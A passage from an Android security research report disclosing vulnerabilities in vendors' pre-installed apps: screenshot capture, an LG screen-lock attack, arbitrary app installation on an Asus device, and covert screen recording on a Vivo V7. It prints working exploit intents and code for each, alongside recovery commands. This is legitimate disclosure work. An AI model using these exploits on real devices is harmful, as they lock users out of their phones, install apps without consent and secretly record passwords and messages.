string (the specific action string depends on the 
device, as it is not constant across devices). The 
contents of the screen buffer are regarded as sensitive. 
All of the devices we examined that allow a third-
party app to indirectly take a screenshot perform 
some animation when a screenshot is taken and leave 
a notification in the status bar, so it is not transparent 
to the user. A notification is created indicating that a 
screenshot was taken. If all caution is thrown to the 
wind, a malicious app may open interesting apps, take 
screenshots, and exfiltrate them. Although the 
screenshot capability cannot be disabled by the user  
due to it residing in the system_server process, this 
approach is aggressive. Figure 3 shows a screenshot 
containing notifications, including a password reset 
sent via text message, taken on a Sony Xperia L1 
Android device containing an active screen lock with 
a 
build 
fingerprint 
of 
Sony/G3313/G3313:7.0/43.0.A.6.49/2867558199:user/release-keys.  A more guileful approach is 
to take screenshots while the user has been inactive for a period of time. This can be accomplished by 
running a service in the background and dynamically registering for the SCREEN_ON and SCREEN_OFF 
36 https://android.googlesource.com/platform/bootable/recovery/+/master/recovery.cpp 
FIGURE 3. SCREENSHOT CONTAINING ACTIVE 
NOTIFICATIONS. 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
broadcast intents to know when the device is actively in use by the user. The attacking app can create an 
activity that will come to the foreground and turn on the screen even when a screen lock is present. This 
can be accomplished by setting the WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED and 
WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD flags on the current window in the activity 
when it is started. If the app requests the EXPAND_STATUS_BAR permission, the app can expand the status 
bar to show the current notifications by getting the system service named statusbar as an IBinder and 
then calling the android.app.StatusBarManager.expandNotificationsPanel() method (for API level 
17 and above) on it via Java reflection and using the open interface to take a screenshot. If the device has 
an active screen lock, only notifications received after the screen lock has been activated will show up when 
a screenshot is taken. The attacking app can then use a generic approach to cause a system crash to remove 
the notification that a picture was taken. All Android devices that run Android 5.0 to Android 6.0.1 have a 
vulnerable app component where a single intent message can cause a system crash due to inadequate 
exception handling in the system_server process. We developed a generic method to cause a system crash 
on all Android API levels by causing the system_server process to exhaust all of its heap memory. An 
open-source PoC app we developed is available here37. Table 7 provides the devices that we found that 
allow any app co-located on the device to utilize an open interface in the system_server process to take a 
screenshot and write it to external storage. Any app with the READ_EXTERNAL_STORAGE permission can 
access the screenshots. 
Table 7. Android Devices that Allow Any App to Take a Screenshot. 
Device 
Broadcast Action 
Build Fingerprint 
Asus ZenFone 
3 Max 
ACTION_APP_TAKE_SCREENSHOT 
asus/US_Phone/ASUS_X008_1:7.0/NRD
90M/US_Phone-14.14.1711.92-
20171208:user/release-keys 
Asus ZenFone 
V Live 
ACTION_APP_TAKE_SCREENSHOT 
asus/VZW_ASUS_A009/ASUS_A009:7.1.
1/NMF26F/14.0610.1802.78-
20180313:user/release-keys 
Alcatel A30 
android.intent.action.THREE_POINT
ER_SCREENSHOT 
TCL/5046G/MICKEY6US:7.0/NRD90M/J6
3:user/release-keys 
Nokia 6 TA- 
1025 
com.fih.screen_shot 
Nokia/TA-
1025_00WW/PLE:7.1.1/NMF26F/00WW_3
_32F:user/release-keys 
Sony Xperia 
L1 
com.sonymobile.intent.action.SCRE
EN_CAPTURE 
Sony/G3313/G3313:7.0/43.0.A.6.49/
2867558199:user/release-keys 
Leagoo P1 
com.android.screen.shot 
LEAGOO/t592_otd_p1/t592_otd_p1:7.
0/NRD90M/1508151212:user/release-
keys 
13. LG Android Devices – Lock the User out of Their Device 
We found a rather unique and interesting attack present on certain LG devices that allows a zero-permission 
app to lock the user out of their device by applying a screen lock that is completely unresponsive to the user 
except for making emergency phone calls. We verified that the devices show below are vulnerable. 
LG G6 - lge/lucye_nao_us_nr/lucye:7.0/NRD90U/17355125006e7:user/release-keys 
LG Q6 - lge/mhn_lao_com_nr/mhn:7.1.1/NMF26X/173421645aa48:user/release-keys 
37 https://github.com/Kryptowire/daze 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
LG X Power - lge/k6p_usc_us/k6p:6.0.1/MXB48T/171491459f52c:user/release-keys 
LG Phoenix 2 - lge/m1v_att_us/m1v:6.0/MRA58K/1627312504f12:user/release-keys  
An exposed dynamically-registered broadcast receiver within the com.android.systemui app 
(versionCode=600170209, versionName=6.00.170209) allows any app on the device to essentially lock 
the user out of their phone in most cases. This technique could be used to create a crypto-less ransomware 
to force the user to pay to unlock their device. Below are the SHA-256 hashes for the com.lge.gnsslogcat 
app’s APK file and ODEX file from the LG G6 device. 
97e5e02340417c997476861c0c4d316d0ced24dd6906f9aa2afd9f3ad15ccc0f  LGSystemUI.apk 
9dfc1b1e4591f0dc739dd583c14f8a6251626eaae302430da0e032e61772edbf  LGSystemUI.odex 
The com.android.systemui.keyguard.KeyguardViewMediator class dynamically registers a broadcast 
receiver with an action of com.lge.CMCC_DM_PARTIALLY_LOCK, as well as for other actions. When a 
broadcast intent is sent by any app on the device, it will be received by an anonymous class within the 
KeyguardViewMediator 
class. 
This 
will 
in 
turn 
call 
the 
KeyguardViewMediator.doKeyguardUnlockDisabled(Boolean, java.lang.String) method. This 
method will set both the com.lge.CMCC_DM_LOCK and UnlockCallerNum keys in the system table to a 
value of 1 and then call the KeyguardViewMediator.doKeyguardTimeout(android.os.Bundle) method 
to lock the screen. At this point, the screen will be locked and cannot be unlocked through traditional 
methods. If ADB is not enabled on the device, the user will be forced to boot into recovery mode and 
perform a factory reset to recover the device. If ADB has already been enabled, they can use the unlock 
method described subsequently. Below is the source code to send the broadcast intent. 
sendBroadcast(new Intent("com.lge.CMCC_DM_PARTIALLY_LOCK")); 
The screen lock put in place by the com.android.systemui app that receives the broadcast intent will not 
be responsive to touches except for the emergency call button. This screen lock will persist across system 
reboots and even appear in safe mode. We were unable to find a way to remove this lock screen except 
when ADB was enabled prior to a third-party app co-located on the device forcing the lock screen to lock.  
If ADB was not enabled on the device prior to the screen lock, then the user will likely have to boot into 
recovery mode by pressing a specific key combination at boot time and perform a factory reset, which will 
remove the screen lock but also wipe all the user’s data and app. If ADB was enabled prior to the appearance 
of this special screen lock, then the user could hook their device up to a computer that had already been 
approved provided it’s RSA key fingerprint to the LG device. At this point, the user can enter the following 
command via ADB to unlock the device. 
adb shell am broadcast -a com.lge.CMCC_DM_UNLOCK 
Alternatively, the following set of commands can undo the changes manually in the system table. 
adb shell settings put system com.lge.CMCC_DM_LOCK 0 
adb shell settings put system UnlockCallerNum 0 
A large majority of Android users would not have ADB enabled, as this functionality is for developers and 
Android enthusiasts. In addition, they would need to find out the actions to take to unlock it, which would 
likely be difficult for the average user to discover on their own. 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
14. Asus ZenFone 3 Max – Arbitrary App Installation 
The arbitrary app installation vulnerability was discovered in an Asus ZenFone 3 Max device with a build 
fingerprint of asus/US_Phone/ASUS_X008_1:7.0/NRD90M/US_Phone-14.14.1711.92-
20171208:user/release-keys. This device contains a pre-installed app with a package name of 
com.asus.dm (versionCode=1510500200, versionName=1.5.0.40_171122) has an exposed interface 
that allows any app co-located on the device to use its capabilities to download an arbitrary app over the 
internet and install it. Furthermore, any app that was programmatically installed using this method can 
also be programmatically uninstalled using the com.asus.dm app. The com.asus.dm app has an exported 
service named com.asus.dm.installer.DMInstallerService. Any app on the device can send an 
intent with specific embedded data that will cause the com.asus.dm app to programmatically download 
and install the app. For the app to be downloaded and installed, certain data needs to be provided in the 
intent: download URL, package name, version name from the app’s AndroidManifest.xml file, and the 
MD5 hash of the app. Below is the source code to download and install the Xposed Installer APK file. 
Intent i4 = new Intent(); 
i4.setAction("com.asus.dm.installer.download_app"); 
i4.setClassName("com.asus.dm", "com.asus.dm.installer.DMInstallerService"); 
i4.putExtra("EXTRA_DL_URL", "https://dl-
xda.xposed.info/modules/de.robv.android.xposed.installer_v33_36570c.apk"); 
i4.putExtra("EXTRA_INSTALL_PACKAGE", "de.robv.android.xposed.installer"); 
i4.putExtra("EXTRA_DL_CHECKSUM", "36570c6fac687ffe08107e6a72bd3da7"); 
i4.putExtra("EXTRA_INSTALL_VERSION", "2.7"); 
startService(i4); 
At this point, the Xposed Installer app can be started by the app that initiated its installation. If the app that 
initiated the installation of the Xposed Installer app decides that it should be uninstalled, it can use the 
source code below to uninstall it. This method only works for apps that were installed using the approach 
above and not for apps that were installed via other methods such as the user installing an app via the app 
distribution channel of Google Play. 
Intent i7 = new Intent(); 
i7.setAction("com.asus.dm.installer.removeService"); 
i7.setClassName("com.asus.dm", "com.asus.dm.installer.DMInstallerService"); 
i7.putExtra("EXTRA_APP_NAME", "de.robv.android.xposed.installer"); 
startService(i7); 
15. Video Recording the User’s Screen 
Sometimes pre-installed apps can expose the capability to record the user’s screen through a privileged 
pre-installed app. We provide two instances of screen recording: Vivo V7 and Doogee X5. 
15.1 Vivo V7 – Video Recording the User’s Screen 
The 
Vivo 
V7 
device 
we 
examined 
had 
a 
build 
fingerprint 
of 
vivo/1718/1718:7.1.2/N2G47H/compil04201658:user/release-keys. The device contains a pre-
installed app with a package name of com.vivo.smartshot (versionCode=1, versionName=3.0.0). This 
app will record the screen for 60 minutes and write an mp4 file to a location of the attacking app’s choosing. 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
Normally, a recording notification will be visible to the user, but we will detail an approach to make it 
mostly transparent to the user. The com.vivo.smartshot app has an exported service named 
com.vivo.smartshot.ui.service.ScreenRecordService. 
The 
approach 
is 
to 
start 
the 
ScreenRecordService which will start a separate binary named /system/bin/smartshot that performs 
the recording of the screen. Once the ScreenRecordService is started, it will create a sticky notification 
saying “Recording screen” and create a stop button on the side of the screen. These can be removed by then 
stopping the ScreenRecordService shortly after starting it. After the ScreenRecordService is stopped, 
the /system/bin/smartshot binary continues recording. The recording will continue for 60 minutes and 
there is the possibility that the com.vivo.smartshot app will be killed if there is memory pressure as it 
does not have any active app components. To provide an active component, the attacking app will then start 
the ScreenRecordService with some values embedded in the intent that will not start a new recording or 
interfere with the active recording. If the recording is stopped early, the file may be corrupted, so the entire 
60 minutes should be observed and then the mp4 file will be able to be played without any modification. 
Moreover, the attacking app can have the /system/bin/smartshot binary write the mp4 file to its private 
directory, so the attacking app does not need the READ_EXTERNAL_STORAGE permission to read from external 
storage. This is achieved by first changing the file permissions to the attacking app’s private directory, so 
it can be accessed by the /system/bin/smartshot binary, as SELinux does not block it on the device. 
Once the file permissions are changed to be world-executable on the app’s directory, it will then create an 
empty file using a specific file name that will later be passed to the ScreenRecordService as a file name 
for the mp4 file. Then the newly created file (e.g., screen.mp4) in the attacking app’s private directory is 
made world-writable. To make the user completely oblivious to the recording of the screen, the source code 
below can be executed when the device’s screen is off (requires registering a broadcast receiver listening 
for the SCREEN_OFF broadcast intent), so there is not disturbance to the GUI with the anticipation that the 
user will use their device in the next 60 minutes. Then the attacking app executes the code below as was 
explained above. 
Intent i = new Intent(); 
i.setAction("vivo.action.ACTION_START_RECORD_SERVICE"); 
i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService"); 
i.putExtra("vivo.flag.vedio_file_path", "/data/data/com.some.app/screen.mp4"); 
i.putExtra("show_top_stop_view", false); 
startService(i); 
try { 
    Thread.sleep(500); 
} catch (InterruptedException e) { 
    e.printStackTrace(); 
} 
i = new Intent(); 
i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService"); 
stopService(i); 
try { 
    Thread.sleep(500); 
} catch (InterruptedException e) { 
    e.printStackTrace(); 
} 
i = new Intent("vivo.acton.ACTION_CHANGE_TOP_STOP_VIEW"); 
i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService"); 
i.putExtra("show_top_stop_view", false); 
startService(i); 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
At the end of 60 minutes after executing the code above, the /system/bin/smartshot binary finishes its 
recording and the attacking app can view the previous 60 minutes of the screen usage and observe the user’s 
behavior. This may involve the user entering passwords, entering credit card numbers, writing personal 
messages and emails, etc. This resulting mp4 file can be sent to a remote location if the attacking app has 
the INTERNET permission. 
15.2 Doogee X5 – Video Recording the User’s Screen 
This device allows third party apps to programmatically initiate the recording of the screen by sending an 
intent 
to 
a 
pre-installed 
app. 
The 
build 
fingerprint 
of 
the 
Doogee 
X5 